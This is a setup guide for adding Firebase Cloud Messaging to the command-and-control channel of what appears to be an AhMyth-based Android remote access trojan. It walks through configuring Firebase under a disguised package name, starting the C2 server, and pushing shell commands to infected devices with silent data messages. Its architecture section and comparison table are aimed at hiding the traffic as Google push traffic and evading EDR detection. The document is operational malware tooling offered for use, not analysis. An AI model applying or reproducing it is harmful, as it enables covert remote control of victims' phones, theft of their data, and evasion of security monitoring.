# Firebase Cloud Messaging (FCM) Setup Guide

> **Purpose:** FCM transforms the C2 channel from a persistent WebSocket connection into a stealth push-triggered system. Instead of maintaining an always-on socket, the device receives commands via Firebase push notifications — which look like normal Google Play Service traffic to any network monitor.

---

## 📋 Prerequisites

- A **Google account** (for Firebase Console access)
- The Android project already has the FCM dependency added (`build.gradle` updated)

---

## 🪜 Step-by-Step Setup

### Step 1: Create a Firebase Project

1. Go to [Firebase Console](https://console.firebase.google.com/)
2. Click **Create a project** (or select an existing one)
3. Enter a project name (e.g., `AhMythC2`)
4. Disable **Google Analytics** (not needed)
5. Click **Create project**

### Step 2: Register the Android App

1. In the Firebase project dashboard, click the **Android** icon to add an Android app
2. Enter the package name: **`com.android.background.services`**
3. App nickname: `AhMyth Client`
4. Click **Register app**

### Step 3: Download `google-services.json`

1. After registration, click **Download google-services.json**
2. Place the file at: **`app/google-services.json`** in your project root
3. Click **Next** (the build file steps are already done)
4. Click **Continue to console**

> ⚠️ **IMPORTANT:** The `google-services.json` file contains your Firebase project's API keys. It should be added to `.gitignore` to prevent accidental commits.

### Step 4: Create a Firebase Admin Service Account (for the C2 Server)

1. In Firebase Console, go to **Project Settings** → **Service accounts**
2. Click **Generate new private key**
3. Click **Generate key**
4. Save the downloaded JSON file as: **`.freebuff/service-account.json`**
5. ⚠️ **Never commit this file** — it's already in `.gitignore`

### Step 5: Install Server Dependencies

```bash
cd .freebuff
npm install firebase-admin
```

### Step 6: Start the Server

```bash
node .freebuff/c2-server.js
```

If the setup is correct, you'll see:
```
[FCM] Firebase Admin SDK initialized successfully
[FCM] FCM Push: ✅ Active
```

If you see `❌ Not configured`, the `service-account.json` file is missing or invalid.

---

## 🧪 Verifying FCM Works

### Check Server Status

Open `http://localhost:42474/api/health` — you should see:
```json
{
  "status": "ok",
  "fcmAvailable": true,
  "fcmDevices": 0
}
```

### Check Registered Devices

Open `http://localhost:42474/api/fcm/devices` — shows all devices that have registered their FCM tokens.

### Push a Test Command via curl

```bash
curl -X POST http://localhost:42474/api/fcm/push \
  -H "Content-Type: application/json" \
  -d '{
    "targetFcmToken": "<FCM_TOKEN_FROM_SERVER>",
    "command": {"order": "x0000sm", "extra": "ls"}
  }'
```

---

## 🔄 Architecture Overview

```
┌──────────────┐     FCM Push (silent data msg)     ┌──────────────┐
│  C2 Server   │ ─────────────────────────────────→ │  Google FCM  │
│  (Node.js)   │                                     │  (Firebase)  │
│              │                                     │              │
│  Sends cmd   │                                     │  Delivers    │
│  via FCM API │                                     │  to device   │
└──────────────┘                                     └──────┬───────┘
                                                            │
                                                            ▼
                                                  ┌──────────────────┐
                                                  │  Android Device  │
                                                  │                  │
                                                  │  1. FCM msg      │
                                                  │     received     │
                                                  │  2. Brief socket │
                                                  │     connect      │
                                                  │  3. Execute cmd  │
                                                  │  4. Send result  │
                                                  │  5. Disconnect   │
                                                  └──────────────────┘
```

### When FCM is active:

1. C2 Server receives a command from the dashboard
2. Server sends an FCM data message to the device (silent push — no notification shown)
3. Device's `FirebaseMessagingService.onMessageReceived()` fires
4. Device extracts the command from the FCM payload
5. Device briefly connects to the C2 server via Socket.IO (2–5 seconds)
6. Device executes the command and sends results
7. Device disconnects immediately

### Benefits over persistent Socket.IO:

| Feature | Persistent Socket.IO | FCM-Triggered |
|---------|---------------------|---------------|
| Network visibility | Always-on WebSocket | Brief connections only when commanded |
| Traffic pattern | Anomalous (constant socket) | Looks like Google push notifications |
| Battery impact | Moderate | Minimal (no keep-alive) |
| Detection by EDR | Higher | Lower (blends into Google's traffic) |
| Server resource | 1 socket per device | Ephemeral connections |

---

## 🔒 Security Notes

- The `google-services.json` file exposes your Firebase project number/sender ID — this is normal and intended
- The `service-account.json` file grants full FCM send access — **keep it secret**
- FCM messages are delivered over Google's infrastructure (TLS-encrypted)
- The FCM token changes if the app is reinstalled or the user clears app data

---

## ❌ Troubleshooting

| Symptom | Cause | Fix |
|---------|-------|-----|
| `messaging/registration-token-not-registered` | Stale FCM token | Token was revoked — device needs to re-register |
| `messaging/invalid-argument` | Missing or malformed command | Ensure `order` field is present in command JSON |
| `messaging/quota-exceeded` | Too many messages sent | FCM has rate limits — space commands 1+ second apart |
| Server shows `FCM not configured` | `service-account.json` missing | Download from Firebase Console → Service accounts |
| Device doesn't respond to FCM | `google-services.json` missing or wrong | Verify file exists at `app/google-services.json` |
| `ClassNotFoundException: FirebaseMessaging` | FCM dependency not loaded | Run `./gradlew clean` and rebuild |

---

## 📚 References

- [Firebase Cloud Messaging docs](https://firebase.google.com/docs/cloud-messaging)
- [Firebase Admin SDK setup](https://firebase.google.com/docs/admin/setup)
- [FCM data messages](https://firebase.google.com/docs/cloud-messaging/concept-options#data_messages)
